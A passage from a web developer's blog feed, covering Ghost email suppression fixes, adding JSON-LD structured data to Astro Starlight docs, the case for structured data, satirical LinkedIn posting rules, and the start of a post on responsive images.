/&gt;&lt;/figure&gt;&lt;h2&gt;The Risks&lt;/h2&gt;&lt;p&gt;You have good reason to scrunch your nose a little bit at this. Making production database updates for an application I&apos;m not familiar with isn&apos;t something I&apos;d recommend making a habit. Two particular risks popped into my head as I was doing this: &lt;/p&gt;&lt;p&gt;&lt;strong&gt;#1: What if the member wanted their email disabled?&lt;/strong&gt; &lt;/p&gt;&lt;p&gt;I dismissed this one pretty quickly. The user didn&apos;t take any action to do this. Ghost did. And several of those people had clearly been receiving &amp;amp; opening emails up until now. Plus, if a member didn&apos;t want to receive emails anymore, they could&apos;ve unsubscribed. Or marked me as &quot;spam.&quot;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;#2: What if I harm my domain authority?&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;This was a bigger concern. I was worried that if I started sending emails again after being marked as spam (which might&apos;ve been the reason a member&apos;s email was disabled), my authority as a sender would tank. &lt;/p&gt;&lt;p&gt;Fortunately, that concern was eased after finding an &lt;code&gt;email_spam_complaint_events&lt;/code&gt; table in the database as well. It was completely empty. This was affirming. I must be sending some non-spammy content.&lt;/p&gt;&lt;h2&gt;What Now?&lt;/h2&gt;&lt;p&gt;Well, I monitor. If I&apos;m right about this, the only reason an email address would be disabled again is if it bounces again, dispatching that &lt;code&gt;EmailBouncedEvent&lt;/code&gt; and adding them to the suppression list. But that&apos;s easy enough to visually keeps tabs on in the UI for a member:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/05/image-7.png&quot; alt=&quot;bounced email list&quot; loading=&quot;lazy&quot; width=&quot;960&quot; height=&quot;816&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/05/image-7.png 600w, https://cms.macarthur.me/content/images/2024/05/image-7.png 960w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;I&apos;m just glad further issues &lt;em&gt;shouldn&apos;t&lt;/em&gt; pop up as a surprise again. But we&apos;ll see how things look moving forward. I&apos;m willing to get a little messier in the database if I have to.&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</content:encoded></item><item><title>Adding Structured Data in Astro&apos;s Starlight Documentation Framework</title><link>https://macarthur.me/posts/structured-data-with-starlight</link><guid isPermaLink="true">https://macarthur.me/posts/structured-data-with-starlight</guid><pubDate>Tue, 21 May 2024 02:46:35 GMT</pubDate><content:encoded>&lt;p&gt;I remember when the Astro team first announced &lt;a href=&quot;https://starlight.astro.build/?ref=cms.macarthur.me&quot;&gt;Starlight&lt;/a&gt;, their documentation framework. The timing was perfect. I had been meaning to overhaul the docs for &lt;a href=&quot;https://jamcomments.com/?ref=cms.macarthur.me&quot;&gt;JamComments&lt;/a&gt; and &lt;a href=&quot;https://www.typeitjs.com/?ref=cms.macarthur.me&quot;&gt;TypeIt&lt;/a&gt;, but didn’t want to do so on the shoddy setups they were using at the time. &lt;/p&gt;&lt;p&gt;Since then, all of my side project documentation is built with Starlight, and I&apos;m not moving away anytime soon. I‘d still call the project relatively new, but they’re iterating quickly, so I&apos;m sure things are only going to get even better as time goes on.&lt;/p&gt;&lt;p&gt;At the time of writing, however, there’s one thing they don’t generate for you out of the box: structured data. But they &lt;em&gt;do&lt;/em&gt; allow you to &lt;a href=&quot;https://starlight.astro.build/guides/overriding-components/?ref=cms.macarthur.me&quot;&gt;override individual UI components&lt;/a&gt;. That makes it relatively easy to roll some JSON-LD yourself. &lt;/p&gt;&lt;h2&gt;Overriding the Head Component&lt;/h2&gt;&lt;p&gt;The only component we&apos;re interested in overriding is &lt;code&gt;&amp;lt;Head&amp;gt;&lt;/code&gt;, which very shockingly renders the &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt; of your HTML pages. In your Starlight configuration, add a &lt;code&gt;Head&lt;/code&gt; property to &lt;code&gt;components&lt;/code&gt; and point it to the new component we&apos;re about to build:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// astro.config.mjs

import { defineConfig } from &quot;astro/config&quot;;
import starlight from &quot;@astrojs/starlight&quot;;

export default defineConfig({
  // ... other configuration stuff.
  integrations: [
    starlight({
      components: {
        Head: &quot;/src/components/docs/Head.astro&quot;,
      },
    }),
  ],
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next up, let&apos;s do some light scaffolding for the our new &lt;code&gt;&amp;lt;Head /&amp;gt;&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;---
// our custom Head.astro

import Default from &quot;@astrojs/starlight/components/Head.astro&quot;;

const { title, description } = Astro.props.entry.data;
---

&amp;lt;Default {...Astro.props} /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you refresh your documentation locally, you&apos;ll notice that nothing&apos;s changed. That makes sense. All we&apos;re doing is rendering the same &lt;code&gt;Default&lt;/code&gt; component it would&apos;ve rendered anyway. &lt;/p&gt;&lt;p&gt;Quick note: most of the time, you&apos;ll want to include a &lt;code&gt;&amp;lt;slot /&amp;gt;&lt;/code&gt; as a child of the &lt;code&gt;&amp;lt;Default /&amp;gt;&lt;/code&gt; component to ensure any children passed in are rendered in the correct spot: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;---
import Default from &quot;@astrojs/starlight/WhateverComponent.astro&quot;;
---

&amp;lt;Default&amp;gt;
  &amp;lt;slot/&amp;gt;
&amp;lt;/Default&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But the &lt;code&gt;&amp;lt;Head /&amp;gt;&lt;/code&gt; component &lt;a href=&quot;https://github.com/withastro/starlight/blob/main/packages/starlight/components/Head.astro?ref=cms.macarthur.me&quot;&gt;is a little different&lt;/a&gt;. Instead of rendering a block of JSX, it&apos;s building an array of meta tags that&apos;s mapped to JSX. No &lt;code&gt;children&lt;/code&gt; involved. So, at the time of writing, we&apos;re safe to leave the &lt;code&gt;&amp;lt;slot /&amp;gt;&lt;/code&gt; out.&lt;/p&gt;&lt;h2&gt;Building Structured Data&lt;/h2&gt;&lt;p&gt;Next up, we can build our JSON-LD. We&apos;ll use the &lt;code&gt;schema-dts&lt;/code&gt; for type safety and easier schema construction. You&apos;ll need to &lt;a href=&quot;https://schema.org/?ref=cms.macarthur.me&quot;&gt;choose the schema type&lt;/a&gt; most appropriate for your content, but I&apos;ll be using &lt;code&gt;TechArticle&lt;/code&gt; here, which will be used as a generic for the &lt;code&gt;WithContext&lt;/code&gt; type:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;---
import type { Props } from &quot;@astrojs/starlight/props&quot;;
import Default from &quot;@astrojs/starlight/components/Head.astro&quot;;
import type { TechArticle, WithContext } from &quot;schema-dts&quot;;
---

&amp;lt;Default {...Astro.props} /&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&apos;s now a matter of building some structured data, using the data provided by &lt;code&gt;Astro.props.entry.data&lt;/code&gt; for page-specific information: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;---
import type { Props } from &quot;@astrojs/starlight/props&quot;;
import Default from &quot;@astrojs/starlight/components/Head.astro&quot;;
import type { TechArticle, WithContext } from &quot;schema-dts&quot;;

const { title, description } = Astro.props.entry.data;

const techArticleSchema: WithContext&amp;lt;TechArticle&amp;gt; = {
    &quot;@context&quot;: &quot;https://schema.org&quot;,
    &quot;@type&quot;: &quot;TechArticle&quot;,
    headline: title,
    description: description,
    url: Astro.url.href,
    author: {
      &quot;@type&quot;: &quot;Organization&quot;,
      name: &quot;JamComments&quot;,
      url: &quot;https://jamcomments.com&quot;,
      logo: {
        &quot;@type&quot;: &quot;ImageObject&quot;,
        url: &quot;https://jamcomments.com/img/open-graph.jpg&quot;
      }
  },
  image: {
    &quot;@type&quot;: &quot;ImageObject&quot;,
    url: &quot;https://jamcomments.com/img/open-graph.jpg&quot;
  }
};
---

&amp;lt;Default {...Astro.props} /&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The last step, of course, is to stringify it into your HTML: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;---
  // ...other stuff.
---

&amp;lt;Default {...Astro.props} /&amp;gt;

&amp;lt;script 
    type=&quot;application/ld+json&quot; 
    set:html={JSON.stringify(techArticleSchema)}&amp;gt;
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you refresh a documentation page now, you&apos;ll see it rendered in your HTML as expected:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/05/image-3.png&quot; alt=&quot;JSON-LD structured data rendered into the HTML&quot; loading=&quot;lazy&quot; width=&quot;1510&quot; height=&quot;420&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/05/image-3.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/05/image-3.png 1000w, https://cms.macarthur.me/content/images/2024/05/image-3.png 1510w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Of course, you&apos;re free to tweak anything you like, including the position of the markup relative to everything else in the &lt;code&gt;&amp;lt;head /&amp;gt;&lt;/code&gt;. In the spirit of not holding up anything critical to a user&apos;s experience, I prefer to stick it at the end. But do what you want. No one will die either way.&lt;/p&gt;&lt;h2&gt;Don&apos;t Forget to Validate It&lt;/h2&gt;&lt;p&gt;After deploying it, you&apos;re not quite done. Verify that you actually just shipped some valid structured data. &lt;/p&gt;&lt;p&gt;There are two go-to resources for this: the &lt;a href=&quot;https://validator.schema.org/?ref=cms.macarthur.me&quot;&gt;schema.org validator&lt;/a&gt; and &lt;a href=&quot;https://search.google.com/test/rich-results?ref=cms.macarthur.me&quot;&gt;Google&apos;s rich results test&lt;/a&gt;. Use both. You&apos;d be surprised what one catches when the other says everything&apos;s fine.&lt;/p&gt;&lt;h2&gt;Check in w/ the Starlight Project&lt;/h2&gt;&lt;p&gt;Like I said: the Astro team&apos;s been moving pretty quickly on Starlight ever since it&apos;s been around. So, it&apos;s very possible there will be a dedicated API for doing this sort of thing soon enough. So, keep tabs on their documentation as you&apos;re tinkering.&lt;/p&gt;</content:encoded></item><item><title>It’s Probably Only Getting More Important to Use (Good) Structured Data</title><link>https://macarthur.me/posts/structured-data</link><guid isPermaLink="true">https://macarthur.me/posts/structured-data</guid><pubDate>Sat, 11 May 2024 04:43:55 GMT</pubDate><content:encoded>&lt;p&gt;Search engines have long been scarily good at understanding content on the web, but there&apos;s still a lot to be gained by making &lt;em&gt;explicitly&lt;/em&gt; clear what you&apos;re trying to say and whom it&apos;s intended to help. Tools for doing that have existed for decades – meta tags, sitemaps, and even your &lt;code&gt;robots.txt&lt;/code&gt; file. &lt;/p&gt;&lt;p&gt;One of the more complex and less understood of these tools is &lt;strong&gt;structured data&lt;/strong&gt; – the specially formatted information embedded onto a page, specifically intended for &lt;em&gt;machines&lt;/em&gt; to read. &lt;/p&gt;&lt;p&gt;Until now, those machines have almost always been search engines. And they&apos;ve largely just used it for generating rich snippets like these:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/05/image-1.png&quot; alt=&quot;search results for your mom&apos;s hotdish recipe&quot; loading=&quot;lazy&quot; width=&quot;1422&quot; height=&quot;1246&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/05/image-1.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/05/image-1.png 1000w, https://cms.macarthur.me/content/images/2024/05/image-1.png 1422w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;But we&apos;re in an AI/LLM world now. The traditional understanding of a &quot;search engine&quot; is in flux, and our content is already being read, analyzed, categorized, and regurgitated by an entire new race of machines. In that light, I&apos;m expecting &lt;strong&gt;structured data to become a whole lot more important, as is your ability to leverage it.&lt;/strong&gt;&lt;/p&gt;&lt;h2&gt;A Very Truncated History of Structured Data&lt;/h2&gt;&lt;p&gt;If you&apos;ve worked with structured data, you&apos;re probably thinking of the JSON-LD flavor found in a &lt;code&gt;&amp;lt;script type=&quot;application/ld+json&quot;&amp;gt;&lt;/code&gt; tag. For a recipe, it might look like this: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;script type=&quot;application/ld+json&quot;&amp;gt;
{
	&quot;@context&quot;: &quot;http://schema.org/&quot;,
	&quot;@type&quot;: &quot;Recipe&quot;,
	&quot;name&quot;: &quot;Ur Mom&apos;s Hotdish&quot;,
	&quot;author&quot;: {
		&quot;@type&quot;: &quot;Person&quot;,
		&quot;name&quot;: &quot;Ur Mom&quot;
	},
	&quot;description&quot;: &quot;A really good receipe.&quot;,
	&quot;image&quot;: &quot;https://example.com/ur-moms-hotdish.jpg&quot;,
	&quot;recipeIngredient&quot;: [
		&quot;1 lb ground beef&quot;,
		&quot;whatever&apos;s in the fridge&quot;,
		&quot;love&quot;
	],
	&quot;recipeInstructions&quot;: [
		{
			&quot;@type&quot;: &quot;HowToStep&quot;,
			&quot;text&quot;: &quot;Preheat oven to 350°F.&quot;
		},
		{
			&quot;@type&quot;: &quot;HowToStep&quot;,
			&quot;text&quot;: &quot;In a skillet, cook ground beef so you don&apos;t catch a parasite.&quot;
		},
		{
			&quot;@type&quot;: &quot;HowToStep&quot;,
			&quot;text&quot;: &quot;Throw everything in the oven. Play a round of Court Whist.&quot;
		}
	],
	&quot;recipeYield&quot;: &quot;5 servings for each Scandinavian farmer in your family.&quot;
}
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But that&apos;s not the syntax we started out with. &lt;em&gt;That&lt;/em&gt; story begins a bit earlier than you might think. &lt;/p&gt;&lt;p&gt;Most web page publishers only started caring about structured data when &lt;a href=&quot;https://developers.google.com/search/blog/2009/05/introducing-rich-snippets?ref=cms.macarthur.me&quot;&gt;Google launched rich snippets&lt;/a&gt; in 2009. At the time, two formats were supported for embedding metadata into pages – microformats and RDFa. But the roots go back a decade earlier, even before all life forms were obliterated by the Y2K bug. In fact, the concept was first championed by Mr. Internet himself – Tim Berners-Lee.&lt;/p&gt;&lt;p&gt;Berners-Lee wrote &lt;a href=&quot;https://www.w3.org/People/Berners-Lee/Weaving/Overview.html?ref=cms.macarthur.me&quot;&gt;Weaving the Web&lt;/a&gt; in 1999, laying out his vision for a &quot;semantic web,&quot; a prerequisite for machines being able to read the web, form connections throughout it all, and extract meaning. Directly from that book: &lt;/p&gt;&lt;blockquote&gt;A “Semantic Web,” which makes this possible, has yet to emerge, but when it does, the day-to-day mechanisms of trade, bureaucracy, and our daily lives will be handled by machines talking to machines.&lt;/blockquote&gt;&lt;p&gt;Stepping toward that meant more than writing clean HTML. It would require a standard by which ancillary information exists in the code itself – not for humans, but computers. And that gave way to the &lt;a href=&quot;https://en.wikipedia.org/wiki/Resource_Description_Framework?ref=cms.macarthur.me&quot;&gt;Resource Description Framework&lt;/a&gt; (RDF) proposed in &apos;99, and &lt;a href=&quot;https://en.wikipedia.org/wiki/RDFa?ref=cms.macarthur.me#:~:text=RDFa%20or%20Resource%20Description%20Framework,rich%20metadata%20within%20Web%20documents.&quot;&gt;RDFa&lt;/a&gt; a few years later.&lt;/p&gt;&lt;p&gt;JSON-LD &lt;a href=&quot;https://moz.com/blog/json-ld-for-beginners?ref=cms.macarthur.me#:~:text=It%20is%20an%20implementation%20format,data%20vocabulary%20for%20the%20web.&quot;&gt;initially hit the scene in 2011&lt;/a&gt;, as the nerd-baby of Google, Bing, Yahoo!, and Yandex. Rather than tying up all that metadata in the markup itself, JSON-LD allowed it to be neatly extracted to it&apos;s own location, making it easier to generate and maintain.&lt;/p&gt;&lt;h2&gt;The Growing Benefits of Well-Structured Data&lt;/h2&gt;&lt;p&gt;The central purpose behind structured data is to enable machines to better understand, classify, and do something with your content. And as mentioned, rich snippets has largely been the only way that&apos;s been done. But it&apos;s been a heavy hitter.&lt;/p&gt;&lt;p&gt;Google has a number of &lt;a href=&quot;https://developers.google.com/search/case-studies/overview?ref=cms.macarthur.me&quot;&gt;case studies&lt;/a&gt; on this stuff, and it&apos;s impressive. For example, &lt;a href=&quot;https://developers.google.com/search/case-studies/rakuten-case-study?hl=en&amp;amp;ref=cms.macarthur.me&quot;&gt;Rakuten recipe pages&lt;/a&gt; saw a 2.7x increase in traffic after getting serious about structured data. And Rotten Tomatoes saw a &lt;a href=&quot;https://developers.google.com/search/docs/appearance/structured-data/intro-structured-data?ref=cms.macarthur.me&quot;&gt;substantial increase in click-through rate&lt;/a&gt; for pages with structure data vs. those without. Looking through those case studies, I became pretty sold on the value of earning a rich snippet. And if structured data is my way to get there, I&apos;m in. &lt;/p&gt;&lt;p&gt;But the &quot;search&quot; of the future is already looking more generative and less like showing a list of statistically valuable resources. The whole space is exploding right now, providing tremendous value, but there&apos;s also a ton of room for improvement. &lt;/p&gt;&lt;p&gt;Consider tools like &lt;a href=&quot;https://www.perplexity.ai/?ref=cms.macarthur.me&quot;&gt;Perplexity&lt;/a&gt;, arguably one of the best AI-based alternatives to Google we have right now. It&apos;s incredible how it&apos;s able to curate and lace together sources in an eloquent, digestable way. But it&apos;s not perfect. I&apos;ve personally witnessed output that &lt;em&gt;reads&lt;/em&gt; eloquently, but actually contains contradictions or untruths derived from piecing sources together in the wrong way. It seems these tools would benefit from some &lt;em&gt;structure&lt;/em&gt; to the data they&apos;re processing. Given the fact that &lt;a href=&quot;https://w3techs.com/technologies/overview/structured_data?ref=cms.macarthur.me&quot;&gt;fewer than half&lt;/a&gt; of all websites use &lt;em&gt;any&lt;/em&gt; structured data format, getting even a little serious about it could give you the edge you need &lt;em&gt;now&lt;/em&gt;, and undoubtedly in the future. &lt;/p&gt;&lt;p&gt;With all that in mind, despite the industry being aggressively shaken up right now, investing in good structured data for your content still seems like a reasonable bet to make.&lt;/p&gt;&lt;h2&gt;Getting Started w/ Structured Data&lt;/h2&gt;&lt;p&gt;If you&apos;ve never spent any brain calories on this concept before, it can be a little daunting getting started. You &lt;em&gt;could&lt;/em&gt; dive head-first into &lt;a href=&quot;https://schema.org/?ref=cms.macarthur.me&quot;&gt;schema.org&lt;/a&gt; and just start absorbing, but I&apos;m falling asleep just typing that suggestion. There are &lt;a href=&quot;https://schema.org/docs/schemas.html?ref=cms.macarthur.me&quot;&gt;over 800 types&lt;/a&gt; and countless combinations of properties you could apply to them – overwhelming. Instead, I&apos;d take the following steps: &lt;/p&gt;&lt;p&gt;&lt;strong&gt;First, check if it&apos;s already being generated for you. &lt;/strong&gt;Some platforms will automatically embed JSON-LD based on the type of content they assume you&apos;re writing. The Yoast WordPress plugin, for example, is &lt;a href=&quot;https://yoast.com/help/implementing-schema-with-yoast-seo/?ref=cms.macarthur.me&quot;&gt;pretty good about it&lt;/a&gt;, and it&apos;s already found on a ton of WordPress installations (you might not even realize it&apos;s there). If that&apos;s true, be sure to verify it&apos;s valid. It&apos;s easy enough to crack open the source code and look for that &lt;code&gt;application/ld+json&lt;/code&gt; script tag to do this, but you should also lean on the &lt;a href=&quot;https://validator.schema.org/?ref=cms.macarthur.me&quot;&gt;Schema Markup Validator&lt;/a&gt;. If good structured data exists, it&apos;ll be listed on the page after the analysis is complete, and you can move on with your life.&lt;/p&gt;&lt;p&gt;If it&apos;s not already being done, spend a bit of time &lt;strong&gt;looking for a reputable plugin or extension&lt;/strong&gt;. I mentioned Yoast, but if you&apos;re on another platform, there might be a trustworthy plugin for you to vet and adopt. &lt;a href=&quot;https://statamic.com/addons/optimo-apps/statamic-rich-snippet?ref=cms.macarthur.me&quot;&gt;Here&apos;s one I found&lt;/a&gt; for Statamic that looks solid, but it&apos;ll obviously depend on how your content&apos;s being managed, which will also determine how involved it&apos;ll require you be in setting in up.&lt;/p&gt;&lt;p&gt;The one word of warning here is that you should be aware of the &lt;em&gt;types&lt;/em&gt; of structured data they generate for you. Not everything&apos;s an article or website. What you &lt;em&gt;don&apos;t &lt;/em&gt;want is for a plugin to make unreasonably wide assumptions about the content you&apos;re writing, and then structure it sub-optimally.&lt;/p&gt;&lt;p&gt;If no other option&apos;s on the table, &lt;strong&gt;you&apos;ll need to get your hands dirty and become familiar with the types and hierarchies yourself.&lt;/strong&gt; The go-to place for all of these is &lt;a href=&quot;https://schema.org/?ref=cms.macarthur.me&quot;&gt;schema.org&lt;/a&gt;, which even has &lt;a href=&quot;https://schema.org/docs/schemas.html?ref=cms.macarthur.me&quot;&gt;a decent resource&lt;/a&gt; on exploring the more common types. But other great options exist as well, such as &lt;a href=&quot;https://json-ld.org/playground/?ref=cms.macarthur.me&quot;&gt;json-ld.org&apos;s playground&lt;/a&gt;. &lt;/p&gt;&lt;p&gt;Once you&apos;re ready to start crafting JSON, &lt;a href=&quot;https://validator.schema.org/?ref=cms.macarthur.me&quot;&gt;the aforementioned validator&lt;/a&gt; will become a very good, helpful friend. And if you&apos;ve shipped invalid structured data, Google&apos;s Search Console will help to cover your butt too. To give you a peak, here&apos;s what I recently found in the console for my personal site: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/05/image-2.png&quot; alt=&quot;structured data warnings in Google Search Console&quot; loading=&quot;lazy&quot; width=&quot;1442&quot; height=&quot;786&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/05/image-2.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/05/image-2.png 1000w, https://cms.macarthur.me/content/images/2024/05/image-2.png 1442w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Before I even saw that, I was met with an email warning me about the issues – something I very much appreciated. It&apos;s fixed now, by the way.&lt;/p&gt;&lt;h3&gt;Assume There&apos;s a Type for Everything&lt;/h3&gt;&lt;p&gt;When I first started exploring structured data, the types I would reach for were pretty limited – basically &quot;WebPage&quot; or &quot;BlogPosting.&quot; But the breadth of types and subtypes is &lt;em&gt;massive, &lt;/em&gt;and could be used to classify just about anything. You can even classify any sort of &lt;a href=&quot;https://schema.org/GovernmentPermit?ref=cms.macarthur.me&quot;&gt;government permit&lt;/a&gt; with the &lt;code&gt;GovernmentPermit&lt;/code&gt; type: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;{
	&quot;@context&quot;: &quot;https://schema.org&quot;,
	&quot;@type&quot;: &quot;GovernmentPermit&quot;,
	&quot;issuedBy&quot;: {
		&quot;@type&quot;: &quot;GovernmentOrganization&quot;,
		&quot;name&quot;: &quot;&apos;Murica&quot;
	},
	&quot;issuedThrough&quot;: {
		&quot;@type&quot;: &quot;GovernmentService&quot;,
		&quot;name&quot;: &quot;The Constitution&quot;
	},
	&quot;name&quot;: &quot;Freedom&quot;,
	&quot;validFor&quot;: &quot;&apos;til Christ returns&quot;,
	&quot;validIn&quot;: {
		&quot;@type&quot;: &quot;AdministrativeArea&quot;,
   		&quot;name&quot;: &quot;every square inch of this blessed land&quot;
	}
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Blog post comments are also a great example. I never bothered to build JSON-LD for comments because it never crossed my mind that search engines might be interested in categorizing them. But then, &lt;a href=&quot;https://testfully.io/about/?ref=cms.macarthur.me&quot;&gt;Matt from Testfully.io&lt;/a&gt; reached out and let me know of the &lt;a href=&quot;https://schema.org/Comment?ref=cms.macarthur.me&quot;&gt;&quot;Comment&quot; type&lt;/a&gt; that&apos;d fit this type of content perfectly. It can be nested within a &lt;code&gt;CreativeWork&lt;/code&gt; (like a blog post), which helps to build really clear context around &lt;em&gt;all&lt;/em&gt; of the content on a page. Even the user-generated stuff. Since discovering that, it&apos;s now auto-generated for every comment rendered by &lt;a href=&quot;https://jamcomments.com/?ref=cms.macarthur.me&quot;&gt;JamComments&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;The lesson here is to assume that your subject has a type, and only start looking more broadly if it doesn&apos;t. It&apos;ll hopefully leave your content structured in a more specific, useful way before one of the bots encounters it.&lt;/p&gt;&lt;h2&gt;Leave No Room for Ambiguity&lt;/h2&gt;&lt;p&gt;I&apos;ve grown a strong appreciation for the many facets of technical SEO in recent years, and how every one of those facets ladders up to making clear to search engines that your content deserves being shown to a user over someone else&apos;s. As a creator, you can&apos;t control which sources search engines choose to prioritize in the list of results, but you &lt;em&gt;can&lt;/em&gt; do all you can to make that decision as clear as humanly &lt;em&gt;and&lt;/em&gt; technically possible, with no room for ambiguity. &lt;/p&gt;&lt;p&gt;In my opinion, that&apos;s a pretty useful question to ask yourself whenever crafting content: &quot;How can I remove every byte of ambiguity when a search engine&apos;s sizing up my content?&quot; That&apos;s very different from writing &lt;em&gt;for&lt;/em&gt; search engines, by the way. Write for a human. Leave vivid clues for the machines.&lt;/p&gt;</content:encoded></item><item><title>Helpful Guidelines for Posting on LinkedIn</title><link>https://macarthur.me/posts/linkedin</link><guid isPermaLink="true">https://macarthur.me/posts/linkedin</guid><pubDate>Sat, 13 Apr 2024 20:13:59 GMT</pubDate><content:encoded>&lt;p&gt;I’ve been observing some of the posting trends on here and it’s clear we could benefit from a few guidelines. You might think I’m unqualified to give them. But the facts suggest otherwise:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;I won $25 in cold, hard, American cash by winning second place in a community essay contest when I was 12. That’s before most public schoolers learn how to read these days.&lt;/li&gt;&lt;li&gt;I have accumulated 10s of followers on Twitter over the past decade without paying most of them.&lt;/li&gt;&lt;li&gt;I’ve gotten into dozens of heated Facebook debates over the years and I’ve definitely won every one of them without exception.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Needless to say, it’s in your best interest to take these seriously. Some of these may shock you. That’s OK. It’s the feeling of conviction. And conviction breeds growth. Here they are:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Make sure you’ve got a good grip on the concept of a “paragraph” before writing anything. When every sentence is followed by a line break, it feels like I’m reading a torturous block of terms &amp;amp; conditions. Adding all that space doesn’t bring clarity. It makes my thumb sore.&lt;/li&gt;&lt;li&gt;Don’t you dare include a selfie. If you think you can get an exception by shedding tears in that selfie, you’re too far gone and it may be time to delete your account.&lt;/li&gt;&lt;li&gt;There’s no need to end your posts with a footnote introducing yourself. We can see your name and headline on the post. I promise that’s enough.&lt;/li&gt;&lt;li&gt;Serious use of certain emojis are off-limits. They include 💪, 🔥, and 🚀. It’s fine to use them sarcastically, however.&lt;/li&gt;&lt;li&gt;Everyone is a “lover of dad jokes”. It’s like a Democrat saying he’s really into half-baked pseudoscience. Just another tautology.&lt;/li&gt;&lt;li&gt;Make sure you’re really, really clear on number 2.&lt;/li&gt;&lt;li&gt;Resist the urge to turn every tragedy in your life into a profound tale of wisdom. It often feels shoehorned (even conceited) and risks dishonoring the tragedy.&lt;/li&gt;&lt;li&gt;That “unpopular opinion” is probably something everyone already agrees with.&lt;/li&gt;&lt;li&gt;If your post reads like slam poetry, consider publishing it on Tumblr instead of LinkedIn.&lt;/li&gt;&lt;li&gt;No one’s more likely to share one of your own quotes if you post an image of it looking like a screenshot from Twitter.&lt;/li&gt;&lt;li&gt;It’s impossible to build a “meaningful, authentic relationship” by sending connection requests to everyone who commented on a “Social Saturday” post and then forgetting they exist. If you want some good friends, start by going to church.&lt;/li&gt;&lt;li&gt;Go ahead and put that link to your blog in your post. Sticking it in a comment just signals your submission to the will of the algorithm. If we all cut that nonsense, it’ll change.&lt;/li&gt;&lt;li&gt;We don’t need an emoji legend instructing us how to respond in the comments. It’s obvious what you’re really interested in, ya stinker.&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Take these to heart, walk by them, and let me know if I’ve left anything out. Get out there &amp;amp; crush it, LinkedIn fam!&lt;/p&gt;&lt;p&gt;14.   Never use the phrase &quot;LinkedIn fam.&quot;&lt;/p&gt;&lt;p&gt;Alex 💪🔥🚀&lt;/p&gt;</content:encoded></item><item><title>Looking Forward to (Hopefully) Not Needing Responsive Images One Day</title><link>https://macarthur.me/posts/distaste-for-responsive-images</link><guid isPermaLink="true">https://macarthur.me/posts/distaste-for-responsive-images</guid><pubDate>Thu, 04 Apr 2024 23:00:14 GMT</pubDate><content:encoded>&lt;p&gt;I’ve decided I don’t like the responsive image API in HTML, or at least the idea that we still need it as a performance tool.&lt;/p&gt;&lt;p&gt;By &quot;responsive,&quot; I mean &quot;show different versions of an image based on device,&quot; using only HTML. If it’s been a minute, here’s a recap. You can render responsive images in two flavors: the &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; element with a &lt;code&gt;srcset&lt;/code&gt; attribute, or the &lt;code&gt;&amp;lt;picture&amp;gt;&lt;/code&gt; element. &lt;/p&gt;&lt;p&gt;Let’s say we’re working with a larger JPEG – 2,000px wide. Using an image tag, you might create two versions and render them based on viewport size:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;img 
	src=&quot;ur-mom-2000px.jpg&quot; 
	srcset=&quot;ur-mom-600px.jpg 600w, ur-mom-2000px.jpg 2000w&quot; 
	sizes=&quot;(max-width: 600px) 100vw, 2000px&quot; 
	alt=&quot;Your Mother&quot;
&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Or using a picture element, it’d look like this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;picture&amp;gt;
	&amp;lt;source media=&quot;(max-width: 600px)&quot; srcset=&quot;ur-mom-600px.jpg&quot;&amp;gt;
	&amp;lt;source srcset=&quot;ur-mom-2000px.jpg&quot;&amp;gt;
	&amp;lt;img src=&quot;ur-mom-2000px.jpg&quot; alt=&quot;Your Mother&quot;&amp;gt;
